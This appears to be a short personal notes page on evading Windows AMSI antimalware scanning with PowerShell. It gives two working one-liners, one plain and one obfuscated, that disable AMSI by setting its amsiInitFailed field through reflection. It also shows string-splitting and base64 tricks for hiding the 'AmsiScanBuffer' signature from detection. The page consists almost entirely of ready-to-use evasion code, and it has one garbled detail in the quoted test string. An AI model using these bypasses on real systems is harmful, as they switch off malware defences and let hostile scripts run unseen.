https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4

![[2._Powershell  Bypass#Execution bypass]]

AMSI test:
```
'AMSI Test Sample: 7e72c3cw-861b-4339-8740-0ac1484c1386'
```

```
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```

OR

```
SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```


AMSI typically flags the string AmsiScanBuffer, a common component of patching-based evasions, as malicious, but here you can see that string concatenation allows us to bypass detection

```
"Ams" + "iS" + "can" + "Buff" + "er"
```

`AmsiScanBuffer`

```
$b = [System.Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI=")
```

```
[System.Text.Encoding]::UTF8.GetString($b
```

`AmsiScanBuffer`

